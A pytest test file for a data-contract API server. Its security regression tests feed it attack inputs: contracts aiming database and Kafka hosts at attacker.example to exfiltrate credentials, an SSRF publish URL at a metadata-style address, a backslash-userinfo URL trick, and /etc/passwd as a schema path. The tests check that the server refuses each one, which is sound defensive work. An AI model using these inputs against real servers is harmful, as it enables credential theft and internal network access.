from unittest.mock import patch

import pytest
import requests
import responses
from fastapi.testclient import TestClient

from datacontract.api import ALLOW_LOCAL_FILES_ENV, app
from datacontract.model.exceptions import DataContractException

client = TestClient(app)


def test_lint():
    with open("fixtures/lint/valid_datacontract.yaml", "r") as f:
        data_contract_str = f.read()

    response = client.post(
        url="/lint",
        json=data_contract_str,
    )
    assert response.status_code == 200
    print(response.json())
    assert response.json()["result"] == "passed"
    assert len(response.json()["checks"]) == 1
    assert all([check["result"] == "passed" for check in response.json()["checks"]])


def test_export_jsonschema_dcs():
    with open("fixtures/local-json/datacontract.yaml", "r", encoding="utf-8") as f:
        data_contract_str = f.read()
    response = client.post(
        url="/export?format=jsonschema",
        json=data_contract_str,
    )
    assert response.status_code == 200
    print(response.text)
    with open("fixtures/local-json/datacontract.json") as file:
        expected_json_schema = file.read()
    print(expected_json_schema)
    assert response.text == expected_json_schema


def test_changelog():
    with open("fixtures/changelog/integration/changelog_integration_v1.yaml", "r") as f:
        v1 = f.read()
    with open("fixtures/changelog/integration/changelog_integration_v2.yaml", "r") as f:
        v2 = f.read()
    response = client.post(url="/changelog", json={"v1": v1, "v2": v2})
    assert response.status_code == 200
    data = response.json()
    assert "summary" in data
    assert "entries" in data
    assert len(data["entries"]) > 0
    assert len(data["summary"]) > 0
    entry = data["entries"][0]
    assert "path" in entry
    assert entry["type"] in ("added", "removed", "updated")
    assert "old_value" in entry
    assert "new_value" in entry


def test_changelog_invalid_yaml():
    invalid_yaml = "invalid: yaml: content: ["
    response = client.post(url="/changelog", json={"v1": invalid_yaml, "v2": "valid: yaml"})
    assert response.status_code == 422
    detail = response.json()["detail"]
    assert detail.startswith("Data Contract Validation Failure:")
    assert "Cannot parse YAML" in detail


def test_breaking():
    with open("fixtures/changelog/integration/changelog_integration_v1.yaml", "r") as f:
        v1 = f.read()
    with open("fixtures/changelog/integration/changelog_integration_v2.yaml", "r") as f:
        v2 = f.read()
    response = client.post(url="/breaking", json={"v1": v1, "v2": v2})
    assert response.status_code == 200
    data = response.json()
    assert "v1" not in data
    assert "v2" not in data
    assert data["is_breaking"] is True
    assert "summary" in data
    assert "entries" in data
    assert data["entries"][0]["level"] in ("info", "warning", "error")
    assert "message" in data["entries"][0]


def test_breaking_invalid_yaml():
    response = client.post(url="/breaking", json={"v1": "invalid: yaml: [", "v2": "valid: yaml"})
    assert response.status_code == 422


def test_changelog_invalid_data_contract():
    invalid_contract = """
    apiVersion: '1.0'
    servers:
      - type: invalid_type
    """
    response = client.post(url="/changelog", json={"v1": invalid_contract, "v2": "valid: yaml"})
    assert response.status_code == 422
    assert "Invalid data contract" in response.json()["detail"]


def _valid_contract_yaml():
    with open("fixtures/changelog/integration/changelog_integration_v1.yaml", "r") as f:
        return f.read()


def test_changelog_yaml_error_returns_422():
    import yaml

    with patch("datacontract.api.DataContract") as mock_dc:
        mock_dc.side_effect = yaml.YAMLError("bad yaml")
        response = client.post(url="/changelog", json={"v1": _valid_contract_yaml(), "v2": _valid_contract_yaml()})
    assert response.status_code == 422
    detail = response.json()["detail"]
    assert detail.startswith("Invalid YAML:")
    assert "bad yaml" in detail


def test_changelog_pydantic_validation_error_returns_422():
    import pydantic

    class _StrictModel(pydantic.BaseModel):
        required_int: int

    try:
        _StrictModel(required_int="not-an-int")
    except pydantic.ValidationError as exc:
        validation_error = exc

    with patch("datacontract.api.DataContract") as mock_dc:
        mock_dc.side_effect = validation_error
        response = client.post(url="/changelog", json={"v1": _valid_contract_yaml(), "v2": _valid_contract_yaml()})
    assert response.status_code == 422
    detail = response.json()["detail"]
    assert detail.startswith("Invalid data contract:")
    assert "required_int" in detail


def test_changelog_data_contract_exception_returns_422():
    with patch("datacontract.api.DataContract") as mock_dc:
        mock_dc.side_effect = DataContractException(type="test", name="test", reason="something went wrong")
        response = client.post(url="/changelog", json={"v1": _valid_contract_yaml(), "v2": _valid_contract_yaml()})
    assert response.status_code == 422
    detail = response.json()["detail"]
    assert detail.startswith("Data Contract Validation Failure:")
    assert "something went wrong" in detail


# ---------------------------------------------------------------------------
# A posted contract may reference an authoritativeDefinition by URL, and the
# server fetches it. What that fetch answered is an observation of the server's
# network, so it must not be echoed back to whoever posted the contract.
# ---------------------------------------------------------------------------


def _contract_referencing(url: str) -> str:
    return f"""
apiVersion: v3.0.2
kind: DataContract
id: definition-ref
version: 1.0.0
status: draft
schema:
  - name: t
    properties:
      - name: c
        authoritativeDefinitions:
          - type: definition
            url: {url}
"""


@responses.activate
def test_changelog_definition_resolution_failure_does_not_echo_the_response():
    internal_url = "http://internal.example.com:8080/admin/definitions/c"
    responses.add(responses.GET, internal_url, status=401)

    contract = _contract_referencing(internal_url)
    response = client.post(url="/changelog", json={"v1": contract, "v2": contract})

    assert response.status_code == 422
    assert response.json()["detail"] == f"Could not resolve authoritative definition '{internal_url}'."


@responses.activate
def test_export_definition_resolution_failure_does_not_echo_the_transport_error():
    internal_url = "http://internal.example.com:8080/admin/definitions/c"
    responses.add(responses.GET, internal_url, body=requests.exceptions.ConnectionError("connection refused"))

    response = client.post(url="/export?format=odcs", json=_contract_referencing(internal_url))

    assert response.status_code == 422
    assert response.json()["detail"] == f"Could not resolve authoritative definition '{internal_url}'."


# ---------------------------------------------------------------------------
# The schema parameter is documented as a URL. Without that being enforced,
# fetch_schema falls through to the filesystem, so an unauthenticated caller
# could have the server open its own files and tell existing paths from missing
# ones by the error returned.
# ---------------------------------------------------------------------------
def _lint_with_schema(schema: str):
    with open("fixtures/lint/valid_datacontract.yaml") as f:
        return client.post(url="/lint", params={"schema": schema}, json=f.read())


def test_a_local_path_as_schema_is_rejected():
    response = _lint_with_schema("/etc/passwd")

    assert response.status_code == 422
    assert "http://" in response.json()["detail"]


def test_a_missing_path_is_rejected_the_same_way():
    """Identical responses, so nothing can be learned about the filesystem."""
    existing = _lint_with_schema("/etc/passwd")
    missing = _lint_with_schema("/nonexistent/path")

    assert existing.status_code == missing.status_code == 422
    assert existing.json() == missing.json()


def test_a_relative_path_is_rejected():
    assert _lint_with_schema("fixtures/lint/valid_datacontract.yaml").status_code == 422


def test_an_http_url_is_still_accepted():
    """Only the filesystem fallback is closed; URLs keep working."""
    with patch("datacontract.lint.schema.requests.get") as get:
        get.return_value.json.return_value = {"type": "object"}
        response = _lint_with_schema("https://example.com/schema.json")

    assert response.status_code == 200


def test_config_headers_resolve_to_a_config_case_insensitively():
    from datacontract.api import config_from_headers

    config = config_from_headers(
        {
            "datacontract-snowflake-username": "svc_test",
            "Datacontract-Snowflake-Password": "super-secret-value",
            "DATACONTRACT-SNOWFLAKE-LOGIN-TIMEOUT": "30",
            "x-api-key": "not-a-config-header",
            "content-type": "application/yaml",
        }
    )

    assert config.get_snowflake_username() == "svc_test"
    assert config.get_snowflake_password() == "super-secret-value"
    assert config.get_snowflake_login_timeout() == 30
    assert "super-secret-value" not in repr(config)


def test_no_config_headers_means_no_config():
    from datacontract.api import config_from_headers

    assert config_from_headers({"x-api-key": "k", "content-type": "application/yaml"}) is None


def test_unknown_config_header_is_rejected():
    with open("fixtures/local-json/datacontract.yaml", "r", encoding="utf-8") as f:
        data_contract_str = f.read()

    response = client.post(
        url="/test",
        content=data_contract_str,
        headers={"Content-Type": "application/yaml", "datacontract-snowflake-typo": "x"},
    )

    assert response.status_code == 400
    assert "DATACONTRACT_SNOWFLAKE_TYPO" in response.json()["detail"]


def test_test_endpoint_uses_config_from_headers(allow_local_files):
    with open("fixtures/local-json/datacontract.yaml", "r", encoding="utf-8") as f:
        data_contract_str = f.read()

    from datacontract.model.run import Run

    with patch("datacontract.api.DataContract") as mock:
        mock.return_value.test.return_value = Run.create_run()
        client.post(
            url="/test",
            content=data_contract_str,
            headers={"Content-Type": "application/yaml", "datacontract-postgres-password": "pw"},
        )

    config = mock.call_args.kwargs["config"]
    assert config.get_postgres_password() == "pw"


@pytest.fixture
def allow_local_files(monkeypatch):
    """These tests use a local fixture file as a convenient data source, which the
    API refuses by default (see test_untrusted_contract.py)."""
    monkeypatch.setenv(ALLOW_LOCAL_FILES_ENV, "true")


def _row_filter_contract():
    with open("fixtures/row-filter/datacontract.yaml", "r", encoding="utf-8") as f:
        return f.read()


def test_test_endpoint_filter_param(allow_local_files):
    response = client.post(
        url="/test?filter=order_id <= 2",
        content=_row_filter_contract(),
        headers={"Content-Type": "application/yaml"},
    )

    assert response.status_code == 200
    assert response.json()["result"] == "passed"
    assert response.json()["filters"] == {"orders": "order_id <= 2"}


def test_test_endpoint_filters_param(allow_local_files):
    response = client.post(
        url='/test?filters={"orders": "order_id <= 2"}',
        content=_row_filter_contract(),
        headers={"Content-Type": "application/yaml"},
    )

    assert response.status_code == 200
    assert response.json()["result"] == "passed"
    assert response.json()["filters"] == {"orders": "order_id <= 2"}


def test_test_endpoint_rejects_invalid_filters_json():
    response = client.post(
        url="/test?filters=orders=order_id",
        content=_row_filter_contract(),
        headers={"Content-Type": "application/yaml"},
    )

    assert response.status_code == 422
    assert "JSON object" in response.json()["detail"]


def test_test_endpoint_rejects_filter_and_filters_together():
    response = client.post(
        url='/test?filter=order_id <= 2&filters={"orders": "order_id <= 2"}',
        content=_row_filter_contract(),
        headers={"Content-Type": "application/yaml"},
    )

    assert response.status_code == 422
    assert "not both" in response.json()["detail"]


def test_entropy_data_api_key_header_is_accepted():
    from datacontract.api import config_from_headers

    config = config_from_headers({"entropy-data-api-key": "key", "entropy-data-host": "https://dc.example.com"})

    assert config.get_entropy_data_api_key() == "key"
    assert config.get_entropy_data_host() == "https://dc.example.com"


def test_config_headers_work_despite_unrelated_malformed_env_var(monkeypatch):
    monkeypatch.setenv("DATACONTRACT_SNOWFLAKE_LOGIN_TIMEOUT", "not-a-number")
    from datacontract.api import config_from_headers

    config = config_from_headers({"datacontract-postgres-username": "u"})

    assert config.get_postgres_username() == "u"


# ---------------------------------------------------------------------------
# DATACONTRACT_CLI_API_KEY protects the API, so it has to protect every
# endpoint of it — not only the two that happened to ask for the key.
# ---------------------------------------------------------------------------
def _post(url: str, api_key: str | None = None):
    headers = {"Content-Type": "application/yaml"}
    if api_key is not None:
        headers["x-api-key"] = api_key
    with open("fixtures/lint/valid_datacontract.yaml") as f:
        return client.post(url=url, content=f.read(), headers=headers)


def test_every_endpoint_rejects_a_missing_api_key(monkeypatch):
    monkeypatch.setenv("DATACONTRACT_CLI_API_KEY", "secret")

    assert _post("/lint").status_code == 401
    assert _post("/export?format=odcs").status_code == 401
    assert _post("/test").status_code == 401
    assert client.post(url="/changelog", json={"v1": "a: b", "v2": "a: b"}).status_code == 401


def test_every_endpoint_rejects_a_wrong_api_key(monkeypatch):
    monkeypatch.setenv("DATACONTRACT_CLI_API_KEY", "secret")

    assert _post("/lint", api_key="not-the-secret").status_code == 403
    assert _post("/export?format=odcs", api_key="not-the-secret").status_code == 403


def test_every_endpoint_accepts_the_correct_api_key(monkeypatch):
    monkeypatch.setenv("DATACONTRACT_CLI_API_KEY", "secret")

    assert _post("/lint", api_key="secret").status_code == 200
    assert _post("/export?format=odcs", api_key="secret").status_code == 200


def test_export_reports_an_unparseable_contract_as_a_client_error():
    """Not as a 500 — the request is the problem, not the server."""
    response = client.post(
        url="/export?format=sql",
        content="not: a: contract: [",
        headers={"Content-Type": "application/yaml"},
    )

    assert response.status_code == 422
    assert "detail" in response.json()


def test_no_cors_headers_for_cross_origin_requests():
    """The API sends no CORS headers, so a browser page on another origin cannot
    read its responses. The only browser client is the same-origin Swagger UI,
    which does not need CORS; every other client is not a browser."""
    response = client.get("/openapi.json", headers={"Origin": "https://evil.example"})
    assert response.status_code == 200
    assert "access-control-allow-origin" not in {k.lower() for k in response.headers}


def test_cross_origin_preflight_is_not_approved():
    """A CORS preflight from a foreign origin gets no approval headers."""
    response = client.options(
        "/export?format=odcs",
        headers={
            "Origin": "https://evil.example",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "content-type",
        },
    )
    assert "access-control-allow-origin" not in {k.lower() for k in response.headers}


# --- B1/C1: an environment-held credential must not be sent to a contract-chosen host ---

from datacontract.api import _reject_environment_credentials_to_untrusted_host  # noqa: E402
from datacontract.config import Config  # noqa: E402

_POSTGRES_CONTRACT = """\
apiVersion: v3.0.2
kind: DataContract
id: exfil
name: exfil
version: 1.0.0
status: active
servers:
  - server: production
    type: postgres
    host: attacker.example
    port: 5432
    database: analytics
    schema: public
schema:
  - name: orders
    logicalType: object
    properties:
      - name: order_id
        logicalType: string
"""


def test_guard_blocks_env_credential_to_contract_host(monkeypatch):
    """The exploit: server holds a postgres password in its env, the contract
    names the host -> the connection must be refused before it is attempted."""
    monkeypatch.setenv("DATACONTRACT_POSTGRES_PASSWORD", "prod-secret")
    monkeypatch.delenv("DATACONTRACT_POSTGRES_HOST", raising=False)
    import pytest
    from fastapi import HTTPException

    with pytest.raises(HTTPException) as exc:
        _reject_environment_credentials_to_untrusted_host(_POSTGRES_CONTRACT, "production", None)
    assert exc.value.status_code == 422
    assert "DATACONTRACT_POSTGRES_HOST" in exc.value.detail


def test_guard_allows_when_operator_pins_the_host(monkeypatch):
    """Operator sets both the password and the host in the environment -> the
    contract's host is ignored and the connection is allowed."""
    monkeypatch.setenv("DATACONTRACT_POSTGRES_PASSWORD", "prod-secret")
    monkeypatch.setenv("DATACONTRACT_POSTGRES_HOST", "db.internal")
    _reject_environment_credentials_to_untrusted_host(_POSTGRES_CONTRACT, "production", None)  # no raise


def test_guard_allows_when_no_environment_secret(monkeypatch):
    """No environment-held credential -> nothing to protect, connection allowed."""
    monkeypatch.delenv("DATACONTRACT_POSTGRES_PASSWORD", raising=False)
    monkeypatch.delenv("DATACONTRACT_POSTGRES_HOST", raising=False)
    _reject_environment_credentials_to_untrusted_host(_POSTGRES_CONTRACT, "production", None)  # no raise


def test_guard_allows_caller_supplied_credentials(monkeypatch):
    """A caller who brings the whole credential set via request config may aim it
    at their own host -- only the server's environment secret is pinned (C1)."""
    monkeypatch.delenv("DATACONTRACT_POSTGRES_PASSWORD", raising=False)
    config = Config.resolve({"DATACONTRACT_POSTGRES_PASSWORD": "caller-secret"})
    _reject_environment_credentials_to_untrusted_host(_POSTGRES_CONTRACT, "production", config)  # no raise


def test_test_endpoint_blocks_credential_exfiltration(monkeypatch):
    """End to end through the API: POST a contract naming the host while the
    server holds a postgres password -> 422, no connection attempted."""
    monkeypatch.setenv("DATACONTRACT_POSTGRES_PASSWORD", "prod-secret")
    monkeypatch.delenv("DATACONTRACT_POSTGRES_HOST", raising=False)
    response = client.post(
        "/test?server=production",
        content=_POSTGRES_CONTRACT,
        headers={"Content-Type": "application/yaml"},
    )
    assert response.status_code == 422
    assert "DATACONTRACT_POSTGRES_HOST" in response.json()["detail"]


def test_edit_server_is_not_guarded(tmp_path):
    """The edit server serves a local file the user owns, so it does not mark
    contracts untrusted and the guard does not apply."""
    from datacontract.command_edit import create_app

    contract_file = tmp_path / "datacontract.yaml"
    contract_file.write_text(_POSTGRES_CONTRACT)
    edit_app = create_app(contract_file)
    assert getattr(edit_app.state, "untrusted_contracts", False) is False


def test_api_app_marks_contracts_untrusted():
    from datacontract.api import app as api_app

    assert api_app.state.untrusted_contracts is True


_KAFKA_CONTRACT = """\
apiVersion: v3.0.2
kind: DataContract
id: kafka-exfil
name: kafka-exfil
version: 1.0.0
status: active
servers:
  - server: production
    type: kafka
    host: attacker.example:9092
    format: json
schema:
  - name: orders
    logicalType: object
    properties:
      - name: order_id
        logicalType: string
"""


def test_guard_blocks_env_kafka_password(monkeypatch):
    """Kafka's broker host is always the contract's, so an env SASL password can
    never be paired with a posted contract -- it must be rejected."""
    monkeypatch.setenv("DATACONTRACT_KAFKA_SASL_PASSWORD", "prod-secret")
    import pytest
    from fastapi import HTTPException

    with pytest.raises(HTTPException) as exc:
        _reject_environment_credentials_to_untrusted_host(_KAFKA_CONTRACT, "production", None)
    assert exc.value.status_code == 422
    assert "kafka" in exc.value.detail


def test_guard_allows_kafka_without_environment_secret(monkeypatch):
    monkeypatch.delenv("DATACONTRACT_KAFKA_SASL_PASSWORD", raising=False)
    _reject_environment_credentials_to_untrusted_host(_KAFKA_CONTRACT, "production", None)  # no raise


# --- publish_url is restricted to environment-pinned platform URLs ---

from datacontract.api import (  # noqa: E402
    _reject_request_platform_host_with_environment_key,
    _reject_unpinned_publish_url,
)

_PLATFORM_ENV_VARS = (
    "ENTROPY_DATA_HOST",
    "DATAMESH_MANAGER_HOST",
    "DATACONTRACT_MANAGER_HOST",
    "ENTROPY_DATA_API_KEY",
    "DATAMESH_MANAGER_API_KEY",
    "DATACONTRACT_MANAGER_API_KEY",
)


@pytest.fixture
def clean_platform_env(monkeypatch):
    for var in _PLATFORM_ENV_VARS:
        monkeypatch.delenv(var, raising=False)
    return monkeypatch


def test_publish_url_platform_domains_allowed(clean_platform_env):
    """The built-in platform domains work without any configuration, subdomains included."""
    _reject_unpinned_publish_url("https://api.entropy-data.com/api/test-results")  # no raise
    _reject_unpinned_publish_url("https://mydomain.entropy-data.com/api/test-results")  # no raise
    _reject_unpinned_publish_url("https://api.datamesh-manager.com/api/test-results")  # no raise
    _reject_unpinned_publish_url(None)  # no publish requested


def test_publish_url_arbitrary_host_refused(clean_platform_env):
    """The SSRF primitive: the run must not be POSTed to a caller-chosen host."""
    from fastapi import HTTPException

    with pytest.raises(HTTPException) as exc:
        _reject_unpinned_publish_url("http://10.0.0.5:8080/latest/meta-data")
    assert exc.value.status_code == 422
    assert "ENTROPY_DATA_HOST" in exc.value.detail
    with pytest.raises(HTTPException):
        _reject_unpinned_publish_url("https://evilentropy-data.com/api/test-results")  # no subdomain dot


def test_publish_url_backslash_userinfo_refused(clean_platform_env):
    """The host guard must see the host requests connects to. urlparse reads a
    backslash as userinfo and the host as the platform; requests connects to
    attacker.example, so the key would be POSTed there."""
    from fastapi import HTTPException

    with pytest.raises(HTTPException):
        _reject_unpinned_publish_url("https://attacker.example\\@entropy-data.com/api/test-results")


def test_publish_url_environment_configured_host_allowed(clean_platform_env):
    clean_platform_env.setenv("ENTROPY_DATA_HOST", "https://dcm.mycompany.example")
    _reject_unpinned_publish_url("https://dcm.mycompany.example/api/test-results")  # no raise


def test_publish_url_header_host_does_not_widen(clean_platform_env):
    """A per-request entropy-data-host header must not make its host an allowed
    publish target -- the guard is refused pre-flight, before any test runs."""
    response = client.post(
        url="/test?publish_url=https://attacker.example/collect",
        json="apiVersion: v3.0.2",
        headers={"entropy-data-host": "https://attacker.example"},
    )
    assert response.status_code == 422
    assert "ENTROPY_DATA_HOST" in response.json()["detail"]


# --- the environment-held platform API key must not follow a request-chosen host ---


def test_platform_guard_blocks_env_key_with_header_host(clean_platform_env):
    """The exploit: server holds the platform key in its env, the request names the
    platform host -> the key would be sent to the request's host, so refuse."""
    from fastapi import HTTPException

    clean_platform_env.setenv("ENTROPY_DATA_API_KEY", "prod-secret")
    with pytest.raises(HTTPException) as exc:
        _reject_request_platform_host_with_environment_key({"ENTROPY_DATA_HOST": "https://attacker.example"})
    assert exc.value.status_code == 422
    assert "ENTROPY_DATA_HOST" in exc.value.detail


def test_platform_guard_allows_env_key_with_env_host(clean_platform_env):
    clean_platform_env.setenv("ENTROPY_DATA_API_KEY", "prod-secret")
    clean_platform_env.setenv("ENTROPY_DATA_HOST", "https://dcm.mycompany.example")
    _reject_request_platform_host_with_environment_key(None)  # no raise


def test_platform_guard_allows_caller_supplied_key_and_host(clean_platform_env):
    """A caller who brings the key itself may aim it wherever they like."""
    clean_platform_env.setenv("ENTROPY_DATA_API_KEY", "prod-secret")
    _reject_request_platform_host_with_environment_key(
        {"ENTROPY_DATA_API_KEY": "callers-own-key", "ENTROPY_DATA_HOST": "https://their.example"}
    )  # no raise


def test_platform_guard_allows_without_environment_key(clean_platform_env):
    _reject_request_platform_host_with_environment_key({"ENTROPY_DATA_HOST": "https://their.example"})  # no raise
